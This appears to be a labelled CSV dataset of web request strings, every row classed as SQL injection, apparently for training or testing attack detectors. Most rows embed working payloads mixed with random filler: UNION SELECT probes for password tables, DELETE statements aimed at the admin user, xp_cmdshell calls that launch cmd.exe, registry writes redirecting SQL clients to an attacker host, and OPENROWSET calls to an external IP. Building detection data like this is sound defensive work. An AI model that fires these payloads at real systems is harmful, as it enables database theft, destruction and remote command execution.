id,class,vector
7430,SqlInjection,/hhcihaest/oSQKIB/rswHueeurTzssrns0b/hqxF/uxcx1LMMBtzk.N-/mJ14CEUOqR/oOQXVRHi5IU/4S@LyETJiw8DHAPl@/oxNPpeTRh_J/usu4aeeaslibLh/mei9l9eT7/tetor.shtml?aee5g=4090&t0cy=go&sdeletePxmlkDO=80251710&tgn59=34989483&4libl7Qw=AND++ascii%28lower%28substring%28%28SELECT++++TOP++++1++++q4lnsnw++++FROM++sysobject+WHERE++xtype++%3D+++%27U%27++++%29%2C1%2C1%29%29%29++%3E++111&8rTqRn6sqsiAeu=904&lOGRz=f-6
7441,SqlInjection,/tHZxb8heLpbUbysdA./woEh/WHg.sElq/hrtncs5.png?
7442,SqlInjection,/Wh37_FB0gGMU/dWgCn-8hIqC45.CjaV/hwooapqtTAUEci/si/oolletocaWgae/hhlNJ/aZyunp9ihIbTHACnjZ7/scripteJn9/tltaeiqiSP/sMfrhoFHf6K/mesolioHceezmeWvw.jpeg?bgJV=and+++++0%3C%3E%28select+++++count%28*%29+from+++a2uars++++where+++ar%3C%3E%29&ttUeencth=bCsCxE3vqn&hijghLrtesno=aeHcvsptm9ehsf2ntn
7455,SqlInjection,/X@/cugwPvjJ/eG50BINQHnosDhGTpLwH/o2nyDyF.9mjbLpv2_om/rhxUx4OUYrWWb/WrtEsga9edt/uR/ntwowab.js?a@b7GzGcvHI=6113107&GWetmp=t%3E6as9ioeoa&sqxwIW_tz=tXJFBp7jsF&tirar9=7769540&0lpBD27=PipcSt&t0TefnuUcee=%5Cjtsltwh%25ht&xtimtd=441724612&rmRUfuz=5172&uu2ns=sRDGD&er=iFid.rwYG&almtc6gfy9ts=%27union+select+PASSWORD+from+++DBA_PASSWORD%3B--
7459,SqlInjection,oemc8A=a4niip&hrm=0mLones'   ); DEL/**/ETE    FROM   users WHERE    upper(username)  =    upper(  'admin&Ts7eo3o7rmtn8=31876665&--rand=znOas>bt&3ffm=718&l3jToep=nhEd&3gteiV=497&mxqDlJ=o&ialt=3358383&etsH=5021985
7463,SqlInjection,tGsto=' /**/ OR   /**/  'ovttl'   >    'S&Havbscriptw=nunion&Avx=irqi2zno
7466,SqlInjection,/en5e_.Wi@46DJtrLRQ30/8j@/5dsnRllAtetuaeberBoe/nFmXil5/dhfDr/rnzaeFhtg/lQ-sNSI6Kc/tL-Dx.muYF2Xql/cqy3HHyrSJ1/hTbZWlj3MIK/bYOR0TCKg/fWi.S8Bjhax5eLNbyz.js?uyoHhYNi6tIy6Ms=and++0%3C%3E%28select+++count%28*%29+++++from++csE+++++where+tnhvB3m%3C%3E%29
7472,SqlInjection,/aoKlu/m1TW1/mW8jGxBZERDHA5ZC6GB/ly9Za_x4/pdliat/6-VrGchildwindow.openF@sock_streamGGQxq/dtnAoeotctstnye/1l-790/tneK8GHN2gJz.html?HLfEReXjfNh=%27+++OR+++%27idBtretn%27++++%3C++%27X
7474,SqlInjection,/yStPh1.ntcLBC/lbe/tqQ4GPfYfbXhK9wI3G.tiff?emssaly4anml=ua8%27++++%29%3B++DELETE++FROM+++++users+++++WHERE++upper%28username%29+++++%3D+++upper%28++%27admin&dedNbe9hpA=02667753&eA=580&5fmaesit=133&cs1cpexae2gn54a=olip6Qp%40iuz&nfeeAin=apeooinose%3CsoelSsam&ejegyreu7hln=qlft0e4e&dueuii53ozwe4=uu&sl=tatow&kF-jdr0l=o+openxeprr%5Cser
7475,SqlInjection,tqnirdo=arlte5k6meupdate1gd&rz3adjaoO=onGktZev&li=o s&estehte7=9esli&dAFQqQ=nformmab&ls5llefdajai=x-gY-&gt=arz&yo=hNov&etcsncopoe=rylyriLe3scs&sr6ongaeris=soieeoe]rfr9m7r&vTM=$-t div&7wap4h9AhMunah=aeeaooaaR'ey&Cdnd=070864
7476,SqlInjection,EnetcateH4n7m-=aaaetm&aceuxn=m)&tn=b]
7478,SqlInjection,/1rnagSexq43mno9wotyr/nHZJ/zFOcUVHU_n./oeus9/mnkhArihalpoeorna/fZrlaanantaoaveskgah/lkgu79D/nrhw/lio6olykepgrsalu/bc@4Xju@55dc0LWL-/UrselectHdI.jpg?tsh=tdo+aayyrptn&1e8dNernlsndy=119&hcneraaldmgsl1=kim4ehTf&WaconnectTNc=3547814&azKsbj4allMmall=tamt06ho&LLXEV0d1Q=36430&oocHoo=n%7E&roaaetreys7e=fRnah2cseyiaUn&dve=4
7480,SqlInjection,/Eosaifh6inngi3nt9a3d/qN1eaD/d4edi/afsn9i2ynaleaAueeah2/ttteislbtceyE/eiu/7E5Ra8adminqUD/2xv0zQXAQKUSnXkT_J2Z/0z2CR-.mspx?.Hio45cU=exec+xp_regwrite+++++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27tm%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27
7485,SqlInjection,/le5aw/Hurataeh7/bpasswdN/bnhJQ1cUHK3l/era3tixhanhreah/06P-Fi..mdb?CpassthruqtPH=jofoxoA4Mariso&iih=scN7FseOnu&7waditWtiodi=zqdHZ91G6VH&ilo9i=adXP6ritans&u4Peebt4wdiEmhs=trthtpassefx&tritA3Lao7r=%27+++++UNION++++++++++ALL++++++++++SELECT+++soGnzt+FROM+zomeDnraiE+++++WHERE++%27%27++++%3D+++%27
7488,SqlInjection,/dt8NoNm@QnYK7N9c/SK7Fexeck2Xscripty1passwd.cJ/zX9Egxvl/Ikjsad/XlSO/lqmkfKsLdcp2l11/psM.png?el=%27++or+++id+++in+%28+select+++*++from++++++++user_db+++++%29&saretgbya=5562&rd=d60Jigeay&eaf6W=waU%3Ee+qSo2s3k%26loyr%7Clog&bgntv=systemall3a-essmy2
7491,SqlInjection,/aCfmRx7wph-@obOs/iqaGTF7ehyX05ovY0/tNAuYAooQ57r0OSm.shtml?ehylNroR=8781723&WorXFb1nI=4&yHrceaWnomtnOe=siadt3utreeefct2R&erh=tth&eek1rrcsAtybqti=87231000&9smrn=erutn%3C&sIA9tg=7383282&ek13v=gystivuP%7Cc&zrl6idra=and+++++0%3C%3E%28select+count%28*%29+from++++lr+where++++tme%3C%3E%29&dmuhejsmsrdn=oNP&glcTj=edtsstyleeoAsfew+&ILw.Cm22t=oid+rnlm7stwH+&lAooihHhn=ro1
7493,SqlInjection,/eFJ/diEwd9eplfo/tJ2Q/yfxo0uhWs7aG.cXq/36QyRfpsRYinWiRmm.htm?a3aHtbiwhest=eRgN&ARAe3eipcualJ=51467703&r0t=aeitp&zROYakTsock_streamxuNu=ednsaniWgdd&tsamT2pEYLzkIU=abIX&sokeu=hcals5ha+%5Csfr&ueasUwe=821192997&doceI6t=ojgv&ldxude=8770457367&certf9nbc6=811&1update8szUF=%27++++OR++++%2730l2ab%27+++BETWEEN+%27R%27+++++AND+++++%27T&zMNX=sdsevsLoidlcmyt&fe2yoiaIeoOaet=pvseirdunt&trnnoem=650&LiaAeojS9etloo=+h+var
7498,SqlInjection,/nJD03pDqBiXf0w.jpg?liwtkndrAtjmnw=es&JDga6iem=069&0oao=a%40tpA&bLkun=vn9hwfcny6egDh&gos3rpen=ipliOxxa8sge&Euedisaso=a4rrc%3Cbgsound&9adMynaatt=rieoP&oyvcbieaelplb6n=%27+%29+UNION+++ALL++SELECT++++4098%2C4%2C4756%2C396%2C0361+++FROM++ru0i++WHERE++%28++++%27%27%3D%27&1in=%3Eintals&jqeOErslH1yO=11705979&5SjY=3478&rmresl7tS=enfhrcpetr&FLr5=9061669388&rh9=tolb
7500,SqlInjection,rsT0lasegxtnaea=l4nteibAZeq&PmailhJgbez=lbfVb&ocotw80sse=' AND USER_NAME()='anlyi&n3nobo6hmaganE=aadminrqel2
7502,SqlInjection,/HEedao/tB.8-yuYl/%ulb3.6turFQ5/a_13DgMXUZB/tecZIe/i.Hbd.Z5/IX/vfu7af/i76n9ltihob/YtRktBh0x.php?BYUod=8x&05G_X98NZYv=741250&aocmtet5h2r1sg=awinntlw&Faeu7ceeounhuwn=sloaasemeb&xoai=%27+++++OR++++%27csetwon%27++++%3D+%27+&ofSIrbu=tT3Ftnaectsrfdnt&sehmt5q=ietNhomemfueltR+to
7516,SqlInjection,/6BN61.exe?r0not9t0=%27+++%29+UN%2F**%2FION+++ALL++++SEL%2F**%2FECT++%27enitio%27%2C0%2C5054%2C%27o6to%27%2C9+++FROM++dl+WHERE+%28%27%27++++%3D++++%27&n5qtJ=atsOes9u6ernqair&documentd6_a=S&ebgs6ir=asmtshxt%3Er%7Eeas&en=ekkMv_s2u&etzwNcis1tcai=1&hh3cwe=1olc9e6eeaenn-&ee9crdhdc=ruisehomeE+reftp
7531,SqlInjection,/8wtionmrot7tTaas0zts/S@ZbS0/osaaeiiocuSn3qnre/ADUTjfinsertd5HpREY/tobh2qV03IE_txNX-.htm?fI0UTG=551&iFnd=043&la=lbehe4ucuD&oaHa9ssshekta=3045730&ac1repjYtas6iz0=%27+%29++UNION+++ALL++++SELECT+++t9obay++++%2C+yhndscLe+++%2C+++haeseh++++FROM+++++6he6++++WHERE+++p8ste++NOT+++IN++++%28+%27two0ssos%27%29+++++AND++ante++++NOT+++IN+++++%28+++%27oaagft%27++%29+++AND+++++%27%27++%3D%27&p8rpersAeei4wy=j%40U
7535,SqlInjection,/itUtceohk5e/nG/Wjqiari8ur/nvdZZ0kJ7nNWngMBoy6/6REdropIDkY6puTS/niWeMIkiIariNKRHqe/n58speiyvj7/telnetLaWidCmWopenuWc/phsTovevFigTdTbDya/EiRnshuoaHeedsml/e6brjThYUZGyhXhzdPE.jpeg?gai=g%29%3Bin%3Eizsthqo%28&uO33dqhk=miEfQL_XKqq
7545,SqlInjection,/td-DwrmUbdl50fElx0/rYHW2nilPiRKAd_-mI/Olerneos0esnenimwrsI/selssdheNdynewsta/7psj1SidkL/eiySsty5RaecmorNp/tm5S-VjzpAqo_/EPBL/dYAzJZ4BmC.-7P4JB/tush.asmx?hhd2oaAfeisipim=tbM&ayt=3lVA&uRd9y=5603&Orrhioa2seqnh=3T&tey32rfeev=36&Iin=bulk++++insert+++++ntj8o++++from++++%27pwdump.exe%27++++with++++%28codepage%3D%27RAW%27++%29&idTeanpYaehc=4tze8aIwtetoz3
7550,SqlInjection,eqoptklTeio4=28&hnodeDm_etc=';    begin     declare    @ret    varchar(8000)  set @ret=':'     select     @ret=@ret+'   '+ut+'/'+password from     eelSee2e    where  t8nnsh>@ret select   @ret   as ret into     foo     end--&t1fbLiwStIz=ihjsd&cQnr=6&wdtto7e3dstTetz=zcn4ii&braieyp=5
7559,SqlInjection,/intau4oleuesitqiurno/Beptathoesetyr/lehJl@1Uz5Xy/La980f/Pa39t/i4nKV0Vg/mg6aneropo/igHXJWEG61CYUg1TaP/eset8lnsnhOeil/aC@IBPWWGf/wUzU.css?uichiatnlt=icoidt64ayoVici&nerefIQb64=ieti%2F&opei=OR++++%27dres%27+%3D++++%27++++%27&nnsGbezWii=segadttELl&SlikeCF8imgqdPp=ho58&shp=hnEewioloeCcQ2the&egmuOi4reoEmp=wojoyn&9eenyjntni=816421&caEi8e6tsu5=20&wnsoojdre3tli=%3Ee&dexstRy=escript%3C&enlajmqau2eOrrn=0
7573,SqlInjection,/yauljeu.sh?sihhnsl=27&eHYstroi2t1awr=%27++group+by++users.id+having++84837%3D84837
7598,SqlInjection,/nF-ZVPbyo/omWA_4R88MA-KA/aaCt/fk3zpLKeh-EXfH/npoBBBLT3SD/ly.uU83_sG6TdTb0h-z/n_z_8Tk7ypJ/et9fetahst/nmlardeni/hhreast5.asmx?eseerj=27594&tgunt6swYdp=r2&vbscriptzMZxiQK=tarsraoatacvdaa&athof=OR++++008929668%3D008929668
7620,SqlInjection,/gct/flI7mRBtzy6sleeUei/yd/pssamCV/sq/o_yJCLwL2fzNxu@ODqpD/twAW4Tm-b2Reh6v./3E0Ljial.asmx?eiyen=ttLavEWD5&psa=tsulgHihbeos&tiyoa0ro=eeteetsoetr0&aanusruwaSb=68352&eldon=dcFO5nnrtei&reaom2oeeo1=%3B++++EXEC%28+%27UNI%27%2B%27ON%27%2B%27++++%27%2B%27SEL%27%2B%27ECT+++++++++%27eeosndk%27%2C01%2C53305%2C%27sshze%27%2C9+++++FROM+Ehkil%29&znicadaKdtTsTe=xml+6sae&Z6q5cISM0XDy=s7j%40e+71ip%25wchild%26
7621,SqlInjection,/epDa4/062/iYWIaxkOIL8cGR/cv/mlrt2UY5Z/eh6laJd/cce6fATf0n/es/cIBWYbUMT.htm?rsyyrkt2=drnErd&fsdo3=7wconnecteq&nkeeikaidd6=opttNr+&ovsgo3dh=%27%3B+++++insert+++into++ssena+++++values%28666%2C%27ad4doin%27%2C%27ml%27%2C0xfffff%29&si=yp5ancdhtnm&iigtAtakNahW1=71071815&iciZ4fn=65038700
7628,SqlInjection,/qaoFhu/dt9r8eRaoobmehat.jpeg?QGG_8Im=Ln&Tlogh@icDI=2790&selectSQ4=i50Qb&nchqUHpAiJZDQ=h5o&le=mfO&aite9m=49273&ZP0wgetserviceshUzV=%27+++++%2F**%2F+++OR+%2F**%2F+++++%27at%27+%3E+++++%27S&C2-ND=tyiobjectl3het%40o&xeahehhdmte92oz=e%5Dadminact%5D%28Hx%7Eye&xea=esdqb&se2g=sW%405UIUfjA&epsiseN4s7T6=gt7er
7644,SqlInjection,ysdcsr6ikiist=aG565&roCr6= it&t|d?avC7  =&8apea=6i&tssa1hesuocaa=i+&sCP=ijsperlea5asirL&rysnEroamdT=eatq'     UNION    ALL    SELECT    s2isaon FROM   ra     WHERE  ''    =  '&-QQncit7hincludeSsstyle=1ra&uduwatiS=mmmagrehEqafe3eh&shqeherb4cot=N'O&M1RpgCOvarh=9928732432&timjphn=arax&x5QYN9R=049460&Zangodr3hib=53447855
7648,SqlInjection,/aH1lJWSlSQ3NOQVz/nzhfBxZql4Z4m@/u48Hg.srt0/PVYkKservicesNp8COchild.dll?ucE7muts2shmide=q%25uCo&nuteionrt9r=zfbrx8ODIsJ&pdlaApgaeT=813681&PJKZDO-H9jad=0hsbHehSEmUipnscow&T0@Y8=7094&oahnjew=%7E&ose0srEcResk=iksrlttt&uAnKplinkEHeI=exec+++xp_regwrite++++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27I8jinrnen%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27&wusthKcei=eJTukE
7662,SqlInjection,Cdub0BtIE=clqrOete9tuay&niznncvgl9Fh=tspd5Cdesr9aoof&ci58Yelrh8Hi=-@insertcNeTe7mqperl&e50=as1V&onAh=707642&aah=eeloGuE&reanmwi='     group    by   users.id having    68508=68508
7663,SqlInjection,/hlxnF60.Os/dne3fenysveoctetibse/obnd.swf?qpmnntas1p=9bqJIHHOFyPK&FfEDZmh.=%27++%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F3%2F**%2FFROM%2F**%2Fend2ohnnWo%2F**%2FWHERE%2F**%2F%28++++%27%27%3D+%27++%2F**%2F&pedi=s64%3Cno
7672,SqlInjection,/def9nbswgh5aee/ou/rutJH/cl/tUek/5@g@vJlam/o90yyYkkYgjOpyoW4XL/Bdnp7.dll?dkcfpa3E=rgqeMe&FPhGy=libdl&jg5id7jUscriptC=7601&i2qonu0reor=psssaerxhntu&YMG6uRN.Y=Juse%3Az%26%3Eo%5DI8ch%7C0an&Dt-bmQO=9089&rteTatnAvuwa=9&s3ensrHemnlc=rms%3D2ahiTlufco&sqca3RiialA=7&5q3OWjCt0_h=me%27%29%3BDELETEFROMusersWHEREupper%28username%29++++%3D+++upper%28%27admin&9d=6042433&edlnaomzzfrpa=849
7673,SqlInjection,/BCbr/39g8/access_logM2EstyleKQ86/i0e@Niy/srM7/abenab/sl8een5DHg3/sAHB/enxsebe.bin?X4locationb5QTesam9hv=77275&elibHa=eetumK&ya38eimdnslfl=p3mWyeD&oaimYt0erR=lx4Nl&mo=t%5Cho6+Tntetcnullen&he=5aunioni&siteaAEnig9tin=74513&r0n3ycsoyn=nimbgsound&ialqc2Epdlyas=OR+3%3E07369617884&0oterte=i
7674,SqlInjection,/_VKXO56L/Kg/xeltele.shtml?jogWlibLdocument=9se&yaietwFluuaewaw=and+0%3C%3E%28select+++++count%28*%29+++from+++++yt+++++where+4ijel%3C%3E%29&F9ttuu3Ehtpasssh=230992&ciA5e=227335595&NP.BE9u@=7&jcnb0u2=r8dv2&eiciees=231417&044dr1h9harA=shn&sepl=1ld&nnodehdocumentM=xtttEhT&gqoosabGot=krandeeetsr4o&aeehceeieipnse=1134654&Bdt1mnd=h
7676,SqlInjection,/yidstdotknL9/iB2Oongkh-ZgV/ek_caCWO3Q3zgS1Vv/agGaL/dwm/a5cweW33f4kjONr6/geltteetso/tmpbetweenACL/icePndAtxRMi@/4cYuffINEsgtK7.asp?sehrHido3shee=liadwAinput&uLtmp62u=ijuatreahq&eahwte=O5ne%27+UNION+%2F**%2F+++++SELECT+muruSe4s6++++FROM+++++dba_users++++WHERE++++uygO+like+%27%2525
7678,SqlInjection,/uHRDG.like@g04vK/gFGrex/8Pq9gn/hntetsTassis/6otjakolh076/cJRQXKz/i2Ajsb7B/eNTSVuvra29neK.js?5lwsTk4qftS=%27r4s&oz4lSaHarO=hl&zin=exec+++++xp_regwrite+++++%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CMSSQLServer%5CClient%5CConnectTo%27%2C%27iuemwhsse%27%2C%27REG_SZ%27%2C%27DBMSSOCN%2Chackersip%2C80%27&cOhmmnolksbaptE=oru4zh&metfEb=9094352&O_mailJZlvY-Te=7763106807&oiil=a+o%27lagtsi%3Du%28ie%28c%3E7&eFqt=jchv
7684,SqlInjection,/earsz1uh/aD7ZSNB_NMzz5L67/azqKS.qxCkfxmpuuDM6O/mRar/rl3zrWDV72/7bseitjs4n/e4snefAdoesoyerf/tquhJ.aspx?eEytacIseQl3=%25utmph+E&i.P.StelnetOh=script%40%24rqt+rr&tiaozal=rts1hpisc&tgoom=83760&f97ei=562&dndotrchDiiu6=wueoyawe2ticssgctc&eCsNeEe9rexg=%27++++%29++UNION+++ALL+SELECT+++685+++++FROM+++sR9urIa+WHERE+++++%28+%27%27+%3D%27
7692,SqlInjection,/rnqUMJwjsDySkkF/ao/Ktsszns/eqAip9Z/l9.shtml?tuiftol=%27+%2B+++++%28+++SELECT++TOP+++++1+++I6n++++FROM+nalc%29+++++%2B++%27
7699,SqlInjection,/evor/9o/cCXtcJ1Rly0d/drmsbtdnweerqexm.mspx?QEoIenA=kied&Ae1nlnHoattr9=nUSL%40jA%405E&tTc54ssge7E2rq=82836383&sea=%3B++select+*++++from++++OPENROWSET%28+%27SQLoledb%27%2C%27uid%3Daoeecsm%3Bpwd%3DsAoae%3BNetwork%3DDBMSSOCN%3BAddress%3D151.32.206.188%2C56912%3B%27%2C%27select++++*+++from+++++iummnrawr%27+++%29
7706,SqlInjection,/iJ_grnU/husEcuh37nptdoDoun/bBigaTlaTl/qw/d_x2uOxBB@Htkb/sPnsfXhvnC@MZwCLh/2anwucos.jpeg?cudltnttqCmjfT=unrD+passthruhu&eIp=00083808&eoin=mrIt9a0eh2s&ehcnzeetnHieU=953735071&oraitto4t9=%27union+select+PASSWORD+from++++DBA_PASSWORD%3B--&N@EJ=5612&iyteygyPsot=jlsa%5D%2Baaccess_logbinobject&euY=aMegp&ne9=jihhnxr0a
7708,SqlInjection,/d4/DW/ssOu7.Y4.css?sntj2e=%27++%29+++++UNION+ALL+SELECT+++++8503++++FROM+eHQP+WHERE+%28+%27%27++++%3D++%27&biu2=on+eeexecpe3c-o+qa%27&ueltrs1e=kwvia&9Vx9fns=673820
7711,SqlInjection,httpswYhaving=stw&6nm0aPitn=sddsamED&tviakMaoem=W&VDHTkI80Paf=uexecfinsert2imgmoot>em&ientw=mnulpec4'   UNION  ALL  SELECT p8hha5ht  FROM     vdml     WHERE     '' =   '&etrdwh=%ewinntg)
7713,SqlInjection,/fBetr5a8ds/tncI8w0YfPZRuNS5.html?esoYlsv=4t&tb8=%7C+%3A&rlfeiPqaebegeee=b8hhgeeetqivtsatek&2icgeclo=4678&jP6hudocumentsamzX6vbscriptj=%27+++OR+++++%27emier%27++BETWEEN+++%27R%27+AND+++%27T&Atiny=mUP
7716,SqlInjection,/C-ftpI@aUI/rWZl_bC.jsp?hteA=tuCna-ie3cmdg&yeEut=q80G%40lFiXii&cEEit5ugklzoar=z&nITA1neht4=941911&eosyrweienyh=%24w%2BOEeiteswe&7ctoslthe=203092&a65e8T=6maoandudf&0cesfeejy=498&slNheDEoOenhe=ttnhnsimpy&sp2uykrdrahe=v%22o%22a&aiuaeTRpzSuM=%27%3BEXECmaster.dbo.xp_cmdshell%27cmd.exe&6Zi4GjMR2acceptd=tAE&SZCoWm3copyBBkexec=03&x4uxTGxxPkqN=Eco
7718,SqlInjection,/ialan3pfdittk/hDAbxjSwEc/fg-Nx/N8WRfznullTQB4MwB@/WservicesRLxVDvNkxgroup
7726,SqlInjection,/berfofdusuey/n3eGrbtr.mdb?Leeaneg=i7%2B&u4atiatXeD2adex=53&wrids=%27++OR+%27d%27%3D+%27+&agosns9endrz1n=eOs&TLmhead9rgoma7=pitscriptsdeletet%26es8tebgsound&eqanjscu0aa0=hako
7742,SqlInjection,/lII8rUivPv@wXip/ciN62xU5f-2dCXK/pqwhereh27m6jor8k8/isot71tsltrr0w/aMv89W@-pQL5.zIglP5/uc/mia.msf?qe=3387+++++or+++id%3E3++++or++++ls_id%3C687117&rt=%28%3Alllsnfrom80rr&jjoitmset2r=a4taom8otshglwtaxn&2nrndth9oj6aya=0490&tg=378&aiwC1ihecna=%3B+qynlusraj8sopy++l&oIowe=An%7Celr3n+hlrpgl&cw20ol2en4tl=hhq&tuiayaoOu=roiaae&useHep=dlfb6iDaoy6ndl&ryohnttuhrHtlnt=etIOin&eehkrbn2T=oeheeteT&vddytd=600&Ejs=270497&iioBea4ousg=2
7744,SqlInjection,ieIs=6000941&gdsenepuveaeeos=47&lDjNAt7.-=4004&SR1Eivari97_=asmso2he&silenehla0Erns=16&Tl9i4r=65214173&hspla=de3sxi3CVd&aefI9h3mrxAtem=chairs'   UN/**/ION    SEL/**/ECT     ubev3rfgea FROM   dba_users  WHERE    et2e like '%25&ashwaneOe=rngxavu
7745,SqlInjection,63Orsdeonmrri=ageekiaeuan9qtii
7764,SqlInjection,/ewumre/ePqygHb769X5Uq/n_1/1honi7/9eEautoexecOZW/hVGBAPpjfzjv0/LC6oN@8/831GE.mspx?whbKsp=8689&zhlsaret5Aeeo=eCU%406ShbZb&ewmiTaogaEitOn=ltohanb&JvIchR-=hpasswd2iaccept&Asr_pWLx=ipylKA&2ivI443Kq5P=3nxdenynNlHgsIeauo&eqleph3iiRl7err=%27%3B+++++EXEC++master.dbo.sp_makewebtask+%27c%3A%5Cinetpub%5Cwwwroot%5CiRe.html%27%2C++%27SELECT+++nntl9mo++FROM+tnl6bn+++WHERE+++++xtype%3D%27%27U%27%27%27&corigeesedms=noleo
7769,SqlInjection,/zbrigsn/ija11x5GM0OZVk2Z/kvVm3OcjkvW/re2r4seL4hateOitce/5urydoyycs3sTttz/qetrp1itra.php?bbneceu=ssyBfpGnCa&Eieo9dtaariziI=oaitle&etf05l=seeieay6m8w6s&iobisHErWwrNipb=n3reasW8telS&6mCObsam3kpOU=eAfpJ&sEi6Wlt8enob=%27%3BEXECmaster.dbo.xp_cmdshell%27cmd.exe&E0TRTnE=npwt&Oe6raukmUi=23545&asi7heuE4tOdb8a=jqUHnIPy0J%40
7798,SqlInjection,/5lGyjCf1GT@a6.cgi?toptUYy=9&dtho9tt7i=aSd&emiipnmqeheo=504936237&y7wJmcL24b_=acsH%2Bna&4admincd2puSJ6like=086144437&Czgachjliby_=paQEjJ&L8lT=n3b1%2B+wsra&ihid=azwei7%7CsnAbetzt&tibrwIc=Uotcoo&JMHt_B0g0GyP=%27%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F25079%2F**%2FFROM%2F**%2Fheh9S0%2F**%2FWHERE%2F**%2F%28++++%27%27+++%3D++%27%2F**%2F&MKXFQ5vgib_=e&tnndbieXni4n=itshi
7812,SqlInjection,/9M.5m_/io5ALphpXj5xmdiv/2a1e6oi8Eltt/2iyinemeug/yCkMXIL7C1BBepKKjAip/tHXw-ctelnetA.jsp?ea=2549&hwstib4a=3HwrP39elR&Httision2e1nmav=907&NIuTYNcopyb=tee&nnv8hs8eb=uhnLofncSi&anNmoqi5Tc=L-EChke7&NTwVRRuR=68&ietiAu=edocument%3El&Zq9aMB=1crtmrdit&ruoe8nE=600187566&vEdztElyige9=9054&14Oeddeudp=68&DhumailC9fRq=%27++++%29+++UNION+ALL+++SELECT+++++1380+++++FROM+++mr++WHERE+%28+%27%27+%3D+%27
7816,SqlInjection,osHOax=4221131&Eyn5emot=4&tahktef=4908069&aesanfes=e&_tC6S=26&05ZV5oU=updateWysusraev|/larAe&6dimokaeb8Ci=em0ymsioDipsmStx7e&Gp.f5zwp-V=A3o3hxformrcpobodyslsgxtermo
7821,SqlInjection,/tnP48/puuehlmavte0aoh/sMFHg/tarwH0Hv9h/nhdtcasolaoOi9o/st2eohe9iu6me7/6ixGN_zppvlqlj/ctsashofigRgLh/MteSetuiktr/7M.php4?orX-ae=var7rbindonainsertecE&HTr8EjPhtaccesYlocationn=980026&9fatnph=R0eeya&sefserrpmro3N=%27UNIONALLSELECTfieldFROMalesasseWHERE%27%27%3D+%27&UIaGf=2misioe&CV.2perlkcZ.replacef=610756&ronuadViejs=ltmttg4ed&asiiAdszu9N2t5r=e&aztntgOlhmnde=97908&4tthai=+%7Eo%25&catCEUnetcat=ecopyne&slo0e1kjIok=nomesnNa4pIof&ntleinrfrshasn=kpieid&ArlO=71&dtHSo2towealreE=937181041
7823,SqlInjection,/K4ZsjKa/e_47zX0Q/vg3iwilreesn/u_M4/ixN907XYnAs.dll?yerhtihrkda=956&qQ_HlikeQYftpuF7P=69&fsYdeleteY-m=o9u&ar=e%3F+%26&bToaxfiw3nr=ce6%2B&ar=pitperlrq+%2Fa+%3EZ&tnml4gEaelaezce=taitxsttsliUjv&o6segntQsr=iapV&6ctav=OR+++%27hbcnamsin%27++%3D+N%27+%27
7832,SqlInjection,/gQq@4httpDECJ/nodenZ7delete3hY/etsoharlAotncnoo/abpasswdoptFStPPT/opYfHCzZR/pMueE4re9ext/ev5u/p0v1sY4dI6vFp524A/kgt/lzwS9sfMqW31j_Dc/tdMj@WqgTkRLHb/jjFigbg39e9ud.asp?sesstAJif=8het2nNw&hsngteC4t4iers=lyn&by=t4tf&JfIZu=Vo4+tg%5B&dtop=3&eePWtgddonnef4m=uTtjvbscript3fl&met=if6VhlL1zk9&lTTIiiEe=46&no7miladnnn=u+gpasswdfNtpseaev7esma&eseote2nxpon1e=usosdtsrOsz&trieaNq8=67016941&.copyBHxsopenz=806
7836,SqlInjection,/XVavF-mL/qmmqd4iqig5aeea/ieTbnyiaoomk/t.qLjbNv8WV1x97-@/eBpurYmgy8Oen/oeaotwosHgaTHfmOiOdr/bsgduoaoent/sHlcCZNGrs/nlqAV692KF/yotioeor2/tVLuWijwSBApP/hHjI.shtml?
7854,SqlInjection,/aWvex@DGyB0MMT/em2Ajq-yDJ/ht0hta5Tewebe3se/i3gZ8asFRm0c/yEJwvuY/tSPcrj.gpqcckhi3gGq/9Oyroy6tUd33_hs.tiff?ux9jjhes=%27select+customer_phone++++%27%7C%7C%27from++customers+++%27%7C%7C%27where+++++customer_surname%3D%27%27%27%7C%7C++++lv_surname%7C%7C%27%27%27+++and+++customer_type%3D1%27%3B
